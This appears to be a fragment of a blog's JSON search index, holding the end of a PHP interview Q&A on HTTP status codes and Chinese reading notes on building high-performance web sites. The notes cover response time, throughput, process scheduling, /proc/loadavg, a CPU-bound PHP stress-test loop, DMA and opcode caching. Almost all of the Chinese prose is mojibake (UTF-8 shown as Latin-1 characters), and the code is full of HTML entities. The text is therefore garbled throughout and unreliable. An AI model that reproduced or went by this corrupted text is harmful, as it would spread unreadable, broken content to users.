404ï¼šè®¿é—®èµ„æºä¸å­˜åœ¨ii. 500ï¼šæœåŠ¡ç«¯é”™è¯¯ï¼ˆä»£ç é”™è¯¯ã€æ–‡ä»¶æƒé™ï¼‰iii. 502ï¼šç½‘å…³é”™è¯¯ï¼ˆwebserver å¼‚å¸¸å¯¼è‡´ï¼ŒNginx/Apache å‘ç”Ÿé”™è¯¯ï¼‰iiii. 504ï¼šç½‘å…³è¶…æ—¶ æŸ¥çœ‹å¯¹åº”çš„æ—¥å¿— å‚è€ƒé“¾æ¥ PHPé¢è¯•é—®ç­”","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"ã€Šæ„å»ºé«˜æ€§èƒ½ Web ç«™ç‚¹ã€‹è¯»ä¹¦ç¬”è®°","slug":"building-a-high-performance-web-site-reading-notes","date":"2021-02-06T15:49:18.000Z","updated":"2021-02-07T10:55:17.460Z","comments":true,"path":"building-a-high-performance-web-site-reading-notes/","link":"","permalink":"https://www.0x2beace.com/building-a-high-performance-web-site-reading-notes/","excerpt":"ã€Šæ„å»ºé«˜æ€§èƒ½ Web ç«™ç‚¹ã€‹è¯»ä¹¦ç¬”è®°","text":"ã€Šæ„å»ºé«˜æ€§èƒ½ Web ç«™ç‚¹ã€‹è¯»ä¹¦ç¬”è®° ç»ªè®ºç­‰å¾…çš„çœŸç›¸å½“åœ¨æµè§ˆå™¨ä¸­è¾“å…¥äº†ä¸€ä¸ªåœ°å€ï¼Œç›´åˆ°æµè§ˆå™¨è¿”å›é¡µé¢ä¹‹å‰çš„é‚£æ®µæ—¶é—´é‡Œï¼Œéƒ½å‘ç”Ÿäº†ä¸€äº›ä»€ä¹ˆå‘¢ï¼Ÿ å¤§æ¦‚ç»å†äº†ä»¥ä¸‹å‡ éƒ¨åˆ†æ—¶é—´ï¼š æ•°æ®åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„æ—¶é—´ å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘å‡ºè¯·æ±‚æ•°æ®åˆ°è¾¾æœåŠ¡å™¨çš„æ—¶é—´ æœåŠ¡ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰å“åº”æ•°æ®ç»è¿‡ç½‘ç»œåˆ°è¾¾å®¢æˆ·ç«¯çš„æ—¶é—´ ç«™ç‚¹æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆå“åº”æ•°æ®çš„æ—¶é—´ æµè§ˆå™¨æœ¬åœ°è®¡ç®—å’Œæ¸²æŸ“çš„æ—¶é—´ â€œæ•°æ®åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„æ—¶é—´â€æˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºå“åº”æ—¶é—´ï¼Œå®ƒçš„å†³å®šå› ç´ ä¸»è¦åŒ…æ‹¬å‘é€çš„æ•°æ®é‡å’Œç½‘ç»œå®½å¸¦ã€‚ ç«™ç‚¹æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆå“åº”æ•°æ®çš„æ—¶é—´ä¸»è¦æ¶ˆè€—åœ¨æœåŠ¡ç«¯ï¼Œå…¶ä¸­åŒ…æ‹¬éå¸¸å¤šçš„ç¯èŠ‚ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨å¦ä¸€ä¸ªæŒ‡æ ‡æ¥è¡¡é‡è¿™éƒ¨åˆ†æ—¶é—´ï¼Œå³æ¯ç§’å¤„ç†è¯·æ±‚æ•°ï¼Œä¹Ÿç§°ååç‡ï¼Œè¿™é‡Œçš„ååç‡å¹¶ä¸æ˜¯æŒ‡å•ä½æ—¶é—´å†…å¤„ç†çš„æ•°æ®é‡ï¼Œè€Œæ˜¯è¯·æ±‚æ•°ã€‚å½±å“æœåŠ¡å™¨ååç‡çš„å› ç´ éå¸¸å¤šï¼Œæ¯”å¦‚ï¼šæœåŠ¡å™¨çš„å¹¶å‘ç­–ç•¥ã€I/O æ¨¡å‹ã€I/O æ€§èƒ½ã€CPU æ ¸æ•°ç­‰ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬åº”ç”¨ç¨‹åºæœ¬èº«çš„é€»è¾‘å¤æ‚åº¦ç­‰ã€‚ æµè§ˆå™¨æœ¬åœ°è®¡ç®—å’Œæ¸²æŸ“çš„æ—¶é—´è‡ªç„¶æ¶ˆè€—åœ¨æµè§ˆå™¨ç«¯ï¼Œå®ƒä¾èµ–çš„å› ç´ åŒ…æ‹¬æµè§ˆå™¨é‡‡ç”¨çš„å¹¶å‘ç­–ç•¥ã€æ ·å¼æ¸²æŸ“æ–¹å¼ã€è„šæœ¬è§£é‡Šå™¨çš„æ€§èƒ½ã€é¡µé¢å¤§å°ã€é¡µé¢ç»„ä»¶ï¼ˆå›¾ç‰‡ã€CSSã€JSç­‰ï¼‰æ•°é‡ã€é¡µé¢ç»„ä»¶ç¼“å­˜çŠ¶å†µã€é¡µé¢ç»„ä»¶åŸŸååˆ†å¸ƒåŠDNS è§£æç­‰ã€‚ æ•°æ®å¾—ç½‘ç»œä¼ è¾“å› ä¸ºå¤§å¤šæ•°å¼€å‘è€…ç”Ÿæ´»åœ¨åº”ç”¨å±‚ï¼Œè¿™äº›ä¼¼ä¹ä¸ä»–ä»¬æ¯«æ— å…³ç³»ï¼Œç„¶è€Œä¸€æ—¦å½“ä½ å¼€å§‹å°†æ³¨æ„åŠ›è½¬å‘ç«™ç‚¹æ€§èƒ½æ—¶ï¼Œè¿™äº›åŸºç¡€çŸ¥è¯†ä¾¿æ˜¯ä½ ä¸èƒ½ä¸çŸ¥é“çš„ã€‚ å¦‚ä½•è®¡ç®—å“åº”æ—¶é—´ å“åº”æ—¶é—´ = å‘é€æ—¶é—´ + ä¼ æ’­æ—¶é—´ + å¤„ç†æ—¶é—´ å‘é€æ—¶é—´å¾ˆå®¹æ˜“è®¡ç®—ï¼Œå³â€æ•°æ®é‡/å®½å¸¦â€œï¼Œæ¯”å¦‚è¦å‘é€100Mbit çš„æ•°æ®ï¼Œè€Œä¸”å‘é€é€Ÿåº¦ä¸º 100Mbit/sï¼Œä¹Ÿå°±æ˜¯å®½å¸¦ä¸º 100Mï¼Œé‚£ä¹ˆå‘é€æ—¶é—´ä¾¿ä¸º 1sã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸¤å°ä¸»æœºä¹‹é—´å¾€å¾€å­˜åœ¨å¤šä¸ªäº¤æ¢èŠ‚ç‚¹ï¼Œæ¯æ¬¡çš„æ•°æ®è½¬å‘ï¼Œéƒ½éœ€è¦èŠ±è´¹å‘é€æ—¶é—´ï¼Œé‚£ä¹ˆæ€»çš„å‘é€æ—¶é—´ä¹ŸåŒ…æ‹¬è¿™äº›è½¬å‘æ—¶æ‰€èŠ±è´¹çš„å‘é€æ—¶é—´ã€‚ ä¼ æ’­æ—¶é—´ä¸»è¦ä¾èµ–äºä¼ æ’­è·ç¦»ï¼Œå› ä¸ºä¼ æ’­é€Ÿåº¦æˆ‘ä»¬å¯ä»¥è¿‘ä¼¼è®¤ä¸ºçº¦ç­‰äº 2.0x108m/sï¼Œé‚£ä¹ˆä¼ æ’­æ—¶é—´ä¾¿ç­‰äºä¼ æ’­è·ç¦»é™¤ä»¥ä¼ æ’­é€Ÿåº¦ã€‚æ¯”å¦‚ä¸¤ä¸ªäº¤æ¢èŠ‚ç‚¹ä¹‹å‰çº¿è·¯çš„é•¿åº¦ä¸º 1000kmï¼Œç›¸å½“äºåŒ—äº¬åˆ°ä¸Šæµ·çš„ç›´çº¿è·ç¦»ï¼Œé‚£ä¹ˆä¸€ä¸ªæ¯”ç‰¹ä¿¡å·ä»çº¿è·¯çš„ä¸€ç«¯åˆ°å¦ä¸€ç«¯çš„ä¼ æ’­æ—¶é—´ä¸º 0.005sã€‚ å¤„ç†æ—¶é—´å°±æ˜¯æŒ‡æ•°æ®åœ¨äº¤æ¢èŠ‚ç‚¹ä¸­ä¸ºå­˜å‚¨è½¬å‘è€Œè¿›è¡Œä¸€äº›å¿…è¦çš„å¤„ç†æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå…¶ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†å°±æ˜¯æ•°æ®åœ¨ç¼“å†²åŒºé˜Ÿåˆ—ä¸­æ’é˜Ÿæ‰€å‘é€çš„æ—¶é—´ã€‚æ³¨æ„ï¼Œå‡†ç¡®åœ°è¯´åº”è¯¥æ˜¯â€ä½ çš„æ•°æ®â€œåœ¨é˜Ÿåˆ—ä¸­æ’é˜Ÿæ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå› ä¸ºåœ¨é˜Ÿä¼ä¸­è¿˜æœ‰å…¶ä»–ä¸ä½ æ¯«ä¸ç›¸å¹²çš„æ•°æ®ã€‚ å¦‚æœå…¨ä¸–ç•Œåªæœ‰ä½ çš„æœåŠ¡å™¨å’Œä½ çš„ç”¨æˆ·åœ¨ä¼ è¾“æ•°æ®ï¼Œé‚£ä¹ˆç”¨äºæ’é˜Ÿå¤„ç†æ—¶é—´å¯ä»¥å¿½ç•¥ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯å°†å“åº”æ—¶é—´çš„è®¡ç®—å…¬å¼æ•´ç†ä¸ºï¼šå“åº”æ—¶é—´ = ï¼ˆæ•°æ®é‡æ¯”ç‰¹æ•° / å¸¦å®½ï¼‰+ ï¼ˆä¼ æ’­è·ç¦» / ä¼ æ’­é€Ÿåº¦ï¼‰+ å¤„ç†æ—¶é—´ å¦å¤–ï¼Œä¸‹è½½é€Ÿåº¦çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼šä¸‹è½½é€Ÿåº¦ = æ•°æ®é‡å­—èŠ‚æ•° / å“åº”æ—¶é—´ æœåŠ¡å™¨å¹¶å‘å¤„ç†èƒ½åŠ›ååç‡æŒ‡çš„æ˜¯å•ä½æ—¶é—´å†…æœåŠ¡å™¨çš„è¯·æ±‚æ•°ã€‚ ååç‡æ˜¯æŒ‡åœ¨ä¸€å®šå¹¶å‘ç”¨æˆ·æ•°çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚èƒ½åŠ›çš„é‡åŒ–ä½“ç°ã€‚ æˆ‘ä»¬è¦ç»Ÿè®¡ååç‡ï¼Œä¾¿å­˜åœ¨ä¸€äº›æ½œåœ¨çš„å‰æï¼Œé‚£å°±æ˜¯å‹åŠ›çš„æè¿°å’Œè¯·æ±‚æ€§è´¨çš„æè¿°ã€‚ å‹åŠ›çš„æè¿°ä¸€èˆ¬åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œå³å¹¶å‘ç”¨æˆ·æ•°å’Œæ€»è¯·æ±‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ¨¡æ‹Ÿå¤šå°‘ä¸ªç”¨æˆ·åŒæ—¶å‘æœåŠ¡å™¨å‘é€å¤šå°‘ä¸ªè¯·æ±‚ã€‚ è¯·æ±‚æ€§è´¨åˆ™æ˜¯å †è¯·æ±‚çš„URL æ‰€ä»£è¡¨çš„èµ„æºçš„æè¿°ï¼Œæ¯”å¦‚ 1KB å¤§å°çš„é™æ€æ–‡ä»¶ï¼Œæˆ–è€…åŒ…å«10 æ¬¡æ•°æ®åº“æŸ¥è¯¢çš„åŠ¨æ€å†…å®¹ç­‰ã€‚ æ‰€ä»¥ï¼Œååç‡çš„å‰æåŒ…æ‹¬å¦‚ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š å¹¶å‘ç”¨æˆ·æ•° æ€»è¯·æ±‚æ•° è¯·æ±‚èµ„æºæè¿° CPU å¹¶å‘è®¡ç®—æœåŠ¡å™¨ä¹‹æ‰€ä»¥å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œåœ¨äºæ“ä½œç³»ç»Ÿé€šè¿‡å¤šæ‰§è¡Œæµä½“å¸Œè®¾è®¡ä½¿å¾—å¤šä¸ªä»»åŠ¡å¯ä»¥è½®æµä½¿ç”¨ç³»ç»Ÿèµ„æºï¼Œè¿™äº›èµ„æºåŒ…æ‹¬CPUã€å†…å­˜ä»¥åŠI/O ç­‰ã€‚ è¿›ç¨‹äº‹å®ä¸Šï¼Œå¤§å¤šæ•°è¿›ç¨‹çš„æ—¶é—´éƒ½ä¸»è¦æ¶ˆè€—åœ¨äº†I/Oæ“ä½œä¸Šï¼Œç°ä»£è®¡ç®—æœºçš„DMAï¼ˆDirect Memory Access ç›´æ¥å†…å­˜è®¿é—®ï¼‰æŠ€æœ¯å¯ä»¥è®©CPU ä¸å‚ä¸I/O æ“ä½œçš„å…¨è¿‡ç¨‹ï¼Œæ¯”å¦‚è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œä½¿å¾—CPU å‘ç½‘å¡æˆ–è€…ç£ç›˜ç­‰ I/O è®¾å¤‡å‘å‡ºæŒ‡ä»¤ï¼Œç„¶åè¿›ç¨‹è¢«æŒ‚èµ·ï¼Œé‡Šæ”¾å‡ºCPU èµ„æºï¼Œç­‰å¾… I/O è®¾å¤‡å®Œæˆå·¥ä½œåé€šè¿‡ä¸­æ–­æ¥é€šçŸ¥è¿›ç¨‹é‡æ–°å°±ç»ªã€‚ æ¯ä¸ªè¿›è¡Œéƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜åœ°å€ç©ºé—´å’Œç”Ÿå‘½å‘¨æœŸã€‚å½“å­è¿›ç¨‹è¢«çˆ¶è¿›ç¨‹åˆ›å»ºåï¼Œä¾¿å°†çˆ¶è¿›ç¨‹åœ°å€ç©ºé—´çš„æ‰€æœ‰æ•°æ®å¤åˆ¶åˆ°è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œå®Œå…¨ç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ‰€æœ‰ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå®ƒä»¬ä¹‹é—´å¯ä»¥é€šä¿¡ï¼Œä½†æ˜¯ä¸äº’ç›¸ä¾èµ–ï¼Œä¹Ÿæ— æƒå¹²æ¶‰å½¼æ­¤çš„åœ°å€ç©ºé—´ã€‚ è¿›ç¨‹è°ƒåº¦å™¨åœ¨å•CPU çš„æœºå™¨ä¸Šï¼Œè™½ç„¶æˆ‘ä»¬æ„Ÿè§‰åˆ°å¾ˆå¤šä»»åŠ¡åœ¨åŒæ—¶è¿è¡Œï¼Œä½†æ˜¯ä»å¾®è§‚æ„ä¹‰ä¸Šè®²ï¼Œä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œè€Œå…¶ä»–çš„è¿›ç¨‹æœ‰çš„å¤„äºæŒ‚èµ·çŠ¶æ€å¹¶ç­‰å¾…å°±ç»ªï¼Œæœ‰çš„å·²ç»å°±ç»ªä½†ç­‰å¾…CPU æ—¶é—´ç‰‡ï¼Œè¿˜æœ‰çš„å¤„äºå…¶ä»–çŠ¶æ€ã€‚ å†…æ ¸ä¸­çš„è¿›ç¨‹è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰ç»´æŠ¤ç€å„ç§çŠ¶æ€çš„è¿›ç¨‹é˜Ÿåˆ—ã€‚åœ¨ Linux ä¸­ï¼Œè¿›ç¨‹è°ƒåº¦å™¨ç»´æŠ¤ç€ä¸€ä¸ªåŒ…æ‹¬æ‰€æœ‰å¯è¿è¡Œè¿›ç¨‹çš„é˜Ÿåˆ—ï¼Œç§°ä¸ºâ€œè¿è¡Œé˜Ÿåˆ—ï¼ˆRun Quereï¼‰â€ï¼Œä»¥åŠä¸€ä¸ªåŒ…æ‹¬æ‰€æœ‰ä¼‘çœ è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹çš„åˆ—è¡¨ã€‚ è¿›ç¨‹è°ƒåº¦å™¨çš„ä¸€é¡¹é‡è¦å·¥ä½œå°±æ˜¯å†³å®šä¸‹ä¸€ä¸ªè¿è¡Œçš„è¿›ç¨‹ï¼Œå¦‚æœè¿è¡Œé˜Ÿåˆ—ä¸­æœ‰ä¸æ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£å°±æ¯”è¾ƒä¼¤è„‘ç­‹äº†ï¼ŒæŒ‰ç…§å…ˆæ¥ååˆ°çš„é¡ºåºä¹Ÿè®¸ä¸æ˜¯é‚£ä¹ˆåˆç†ï¼Œå› ä¸ºè¿è¡Œåœ¨ç³»ç»Ÿä¸­çš„è¿›ç¨‹æœ‰ç€ä¸åŒçš„å·¥ä½œéœ€è¦ï¼Œæ¯”å¦‚æœ‰äº›è¿›ç¨‹éœ€è¦å¤„ç†ç´§æ€¥çš„äº‹ä»¶ï¼Œæœ‰äº›è¿›ç¨‹åªæ˜¯åœ¨åå°å‘é€ä¸å¤ªç´§æ€¥çš„é‚®ä»¶ï¼Œæ‰€ä»¥æ¯ä¸ªè¿›ç¨‹éœ€è¦å‘Šè¯‰è¿›ç¨‹è°ƒåº¦å™¨å®ƒä»¬çš„ç´§æ€¥ç¨‹åº¦ï¼Œè¿™å°±æ˜¯è¿›ç¨‹ä¼˜å…ˆçº§ã€‚ ç³»ç»Ÿè´Ÿè½½åœ¨è¿›ç¨‹è°ƒåº¦å™¨ç»´æŠ¤çš„è¿è¡Œé˜Ÿåˆ—ä¸­ï¼Œä»»ä½•æ—¶åˆ»è‡³å°‘å­˜åœ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£å°±æ˜¯æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚è€Œå½“è¿è¡Œé˜Ÿåˆ—ä¸­æœ‰ä¸æ­¢ä¸€ä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œå°±è¯´æ˜æ­¤æ—¶CPU æ¯”è¾ƒæŠ¢æ‰‹ï¼Œå…¶ä»–è¿›ç¨‹è¿˜åœ¨ç­‰ç€å‘¢ï¼Œè¿›ç¨‹è°ƒåº¦å™¨åº”è¯¥å°½å¿«è®©æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹é‡Šæ”¾CPUã€‚ é€šè¿‡åœ¨ä»»ä½•æ—¶åˆ»æŸ¥çœ‹ /proc/loadavgï¼Œå¯ä»¥äº†è§£åˆ°è¿è¡Œé˜Ÿåˆ—çš„æƒ…å†µã€‚ 12ubuntu@localhost:~$ cat &#x2F;proc&#x2F;loadavg 4.28 4.05 4.02 4&#x2F;482 6246 æ³¨æ„ 4/482è¿™éƒ¨åˆ†ï¼Œå…¶ä¸­çš„ 4 ä»£è¡¨æ­¤æ—¶è¿è¡Œé˜Ÿåˆ—ä¸­çš„è¿›ç¨‹ä¸ªæ•°ï¼Œè€Œ 482 åˆ™ä»£è¡¨æ­¤æ—¶çš„è¿›ç¨‹æ€»æ•°ã€‚ æœ€å³è¾¹çš„ 6246 ä»£è¡¨åˆ°æ­¤æ—¶ä¸ºæ­¢ï¼Œæœ€ååˆ›å»ºçš„ä¸€ä¸ªè¿›ç¨‹IDã€‚ æ¥ä¸‹æ¥ï¼Œå·¦è¾¹çš„ä¸‰ä¸ªæ•°å€¼ï¼Œåˆ†åˆ«æ˜¯ 4.28ã€4.05ã€4.02ï¼Œå®ƒä»¬å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ç³»ç»Ÿè´Ÿè½½ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œç³»ç»Ÿè´Ÿè½½è¶Šé«˜ï¼Œä»£è¡¨CPU è¶Šç¹å¿™ï¼Œè¶Šæ— æ³•å¾ˆå¥½åœ°æ»¡è¶³æ‰€æœ‰è¿›ç¨‹çš„éœ€è¦ã€‚ ä½†æ˜¯ï¼Œç³»ç»Ÿè´Ÿè½½æ˜¯å¦‚ä½•è®¡ç®—è€Œæ¥çš„å‘¢ï¼Ÿæ ¹æ®å®šä¹‰ï¼Œå®ƒæ˜¯åœ¨å•ä½æ—¶é—´å†…è¿è¡Œé˜Ÿåˆ—ä¸­å°±ç»ªç­‰å¾…çš„è¿›ç¨‹æ•°å¹³å‡å€¼ï¼Œæ‰€ä»¥å½“è¿è¡Œé˜Ÿåˆ—ä¸­å°±ç»ªè¿›ç¨‹ä¸éœ€è¦ç­‰å¾…å°±å¯ä»¥é©¬ä¸Šè·å¾—CPU çš„æ—¶å€™ï¼Œç³»ç»Ÿè´Ÿè½½ä¾¿éå¸¸ä½ã€‚å½“ç³»ç»Ÿè´Ÿè½½ä¸º 0.00 æ—¶ï¼Œè¯´æ˜ä»»ä½•è¿›ç¨‹åªè¦å°±ç»ªåå°±å¯ä»¥é©¬ä¸Šè·å¾— CPUï¼Œä¸éœ€è¦ç­‰å¾…ï¼Œè¿™æ—¶å€™ç³»ç»Ÿå“åº”é€Ÿåº¦æœ€å¿«ã€‚ é‚£ä¹ˆï¼Œåˆšæ‰æåˆ°çš„ä¸‰ä¸ªæ•°å€¼ï¼Œä¾¿æ˜¯ç³»ç»Ÿæœ€è¿‘ 1 åˆ†é’Ÿã€5 åˆ†é’Ÿã€15 åˆ†é’Ÿåˆ†åˆ«è®¡ç®—å¾—å‡ºçš„ç³»ç»Ÿè´Ÿè½½ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å…¶ä»–æ–¹æ³•è·å¾—ç³»ç»Ÿè´Ÿè½½ï¼Œæ¯”å¦‚topã€w ç­‰å·¥å…·ï¼Œä»å®ç°æ–¹æ³•ä¸Šçœ‹ï¼Œè¿™äº›å·¥å…·è·å¾—çš„ç³»ç»Ÿè´Ÿè½½éƒ½æ˜¯æ¥æºäº /proc/loadavgã€‚ äº†è§£äº†è¿™äº›å†…å®¹åï¼Œè¦æƒ³æé«˜æœåŠ¡å™¨çš„ç³»ç»Ÿè´Ÿè½½ï¼Œå¾ˆç®€å•ï¼Œåªéœ€è¦ç¼–å†™ä¸€ä¸ªæ²¡æœ‰ä»»ä½• I/O æ“ä½œå¹¶ä¸”é•¿æ—¶é—´å ç”¨ CPU æ—¶é—´çš„PHP è„šæœ¬ï¼Œæ¯”å¦‚ä¸€ä¸ªå¾ªç¯ç´¯åŠ å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678&lt;?php$max &#x3D; 100000000;$sum &#x3D; 0;for ($i &#x3D; 0; $i &lt; $max; ++$i)&#123; $sum +&#x3D; $i;&#125;echo $sum; ç„¶åç”¨100 ä¸ªå¹¶å‘ç”¨æˆ·è¯·æ±‚è¿™ä¸ªè„šæœ¬ï¼Œè¿›è¡Œå‹åŠ›æµ‹è¯•ï¼Œè¿™æ—¶å€™æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½å°±ä¼šçœ‹åˆ°å¦‚ä¸‹ï¼š 1load average: 98.26, 45.89, 17.94 è¿›ç¨‹åˆ‡æ¢æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›æœåŠ¡å™¨æ”¯æŒè¾ƒå¤§çš„å¹¶å‘æ•°ï¼Œé‚£ä¹ˆå°±è¦å°½é‡å‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ï¼Œæœ€ç®€å•çš„åšæ³•å°±æ˜¯å‡å°‘è¿›ç¨‹æ•°ï¼Œå°½é‡ä½¿ç”¨çº¿ç¨‹å¹¶é…åˆå…¶ä»–I/O æ¨¡å‹æ¥è®¾è®¡å¹¶å‘ç­–ç•¥ã€‚ I/Oæ¨¡å‹å¯¹äºç½‘ç»œ I/Oå’Œç£ç›˜ I/Oï¼Œå®ƒä»¬çš„é€Ÿåº¦è¦æ…¢å¾ˆå¤šã€‚è¿™äº›I/O æ“ä½œéœ€è¦ç”±å†…æ ¸ç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆï¼ŒåŒæ—¶ç³»ç»Ÿè°ƒç”¨æ˜¾ç„¶éœ€è¦CPU æ¥è°ƒåº¦ï¼Œè€ŒCPU çš„é€Ÿåº¦æ¯«æ— ç–‘é—®æ˜¯éå¸¸å¿«çš„ï¼Œè¿™å°±ä½¿å¾—CPU ä¸å¾—ä¸æµªè´¹å®è´µçš„æ—¶é—´æ¥ç­‰å¾…æ…¢é€ŸI/O æ“ä½œã€‚ å°½ç®¡æˆ‘ä»¬é€šè¿‡å¤šè¿›ç¨‹ç­‰æ–¹å¼æ¥å……åˆ†åˆ©ç”¨ç©ºé—²çš„CPU èµ„æºï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›èƒ½å¤Ÿè®©CPU èŠ±è´¹è¶³å¤Ÿå°‘çš„æ—¶é—´åœ¨I/O æ“ä½œçš„è°ƒåº¦ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥è…¾å‡ºæ›´å¤šçš„CPU æ—¶é—´æ¥å®Œæˆæ›´å¤šçš„I/O æ“ä½œã€‚ PIOä¸DMAåœ¨ä»‹ç»I/O æ¨¡å‹ä¹‹å‰ï¼Œæœ‰å¿…è¦ç®€å•åœ°è¯´è¯´æ…¢é€ŸI/O è®¾å¤‡å’Œå†…å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“æ–¹å¼ã€‚ æˆ‘ä»¬æ‹¿ç£ç›˜æ¥è¯´ï¼Œå¾ˆæ—©ä»¥å‰ï¼Œç£ç›˜å’Œå†…å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“æ˜¯éœ€è¦CPU æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬è¯»å–ç£ç›˜æ–‡ä»¶åˆ°å†…å­˜ä¸­ï¼Œæ•°æ®è¦ç»è¿‡CPU å­˜å‚¨è½¬å‘ï¼Œè¿™ç§æ–¹å¼ç§°ä¸º PIOã€‚æ˜¾ç„¶è¿™ç§æ–¹å¼éå¸¸ä¸åˆç†ï¼Œéœ€è¦å ç”¨å¤§é‡çš„CPU æ—¶é—´æ¥è¯»å–æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è®¿é—®æ—¶ç³»ç»Ÿå‡ ä¹åœæ­¢å“åº”ã€‚ åæ¥ï¼ŒDMAï¼ˆDirect Memory Access ç›´æ¥å†…å­˜è®¿é—®ï¼‰å–ä»£äº†PIOï¼Œå®ƒå¯ä»¥ä¸ç»è¿‡CPU è€Œç›´æ¥è¿›è¡Œç£ç›˜å’Œå†…å­˜çš„æ•°æ®äº¤æ¢ã€‚åœ¨DMA æ¨¡å¼ä¸‹ï¼ŒCPU åªéœ€è¦å‘DMA æ§åˆ¶å™¨ä¸‹è¾¾æŒ‡ä»¤ï¼Œè®©DMA æ§åˆ¶å™¨æ¥å¤„ç†æ•°æ®çš„ä¼ è¾“å³å¯ï¼ŒDMA æ§åˆ¶å™¨é€šè¿‡ç³»ç»Ÿæ€»çº¿æ¥ä¼ è¾“æ•°æ®ï¼Œä¼ é€å®Œæ¯•å†é€šçŸ¥CPUï¼Œè¿™æ ·å°±å¾ˆå¤§ç¨‹åº¦ä¸Šé™ä½äº†CPU å æœ‰ç‡ï¼Œå¤§å¤§èŠ‚çœäº†ç³»ç»Ÿèµ„æºï¼Œè€Œå®ƒçš„ä¼ è¾“é€Ÿåº¦ä¸PIO çš„å·®å¼‚å¹¶ä¸æ˜¯ååˆ†æ˜æ˜¾ï¼Œå› ä¸ºè¿™ä¸»è¦å–å†³äºæ…¢é€Ÿè®¾å¤‡çš„é€Ÿåº¦ã€‚ opcodeç¼“å­˜æ›´åŠ æ³¨é‡çš„æ˜¯ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´ç¼“å­˜å‘½ä¸­ç‡ï¼Œå¦‚æœæ¯æ¬¡éƒ½èƒ½åœ¨ç¼“å­˜ä¸­æ‰¾åˆ°éœ€è¦çš„æ•°æ®ï¼Œé‚£æ˜¯æœ€ç†æƒ³çš„ç»“æœï¼Œå¦‚æœæ¯æ¬¡éƒ½åœ¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°éœ€è¦çš„æ•°æ®ï¼Œé‚£ä¹ˆç¼“å­˜å°†å˜å¾—æ¯«æ— ä»·å€¼ã€‚ è§£é‡Šå™¨æ ¸å¿ƒå¼•æ“æ ¹æœ¬çœ‹ä¸æ‡‚è¿™äº›è„šæœ¬ä»£ç ï¼Œæ— æ³•ç›´æ¥æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸€ç³»åˆ—çš„ä»£ç åˆ†æå·¥ä½œï¼Œå½“è§£é‡Šå™¨å®Œæˆå¯¹è„šæœ¬ä»£ç çš„åˆ†æåï¼Œä¾¿å°†å®ƒä»¬ç”Ÿæˆå¯ä»¥ç›´æ¥è¿è¡Œçš„ä¸­é—´ä»£ç ï¼Œä¹Ÿç§°ä¸ºæ“ä½œç ï¼ˆOperate Codeï¼Œopcodeï¼‰ã€‚ å¯¹äºè§£é‡Šå‹è¯­è¨€è€Œè¨€ï¼Œä»ç¨‹åºä»£ç åˆ°ä¸­é—´ä»£ç çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬ç§°ä¸ºè§£é‡Šï¼ˆparseï¼‰ï¼Œå®ƒç”±è§£é‡Šå™¨æ¥å®Œæˆã€‚å¯¹äºç¼–è¯‘å‹è¯­è¨€è€Œè¨€ï¼Œä»ç¨‹åºä»£ç åˆ°ä¸­é—´ä»£ç 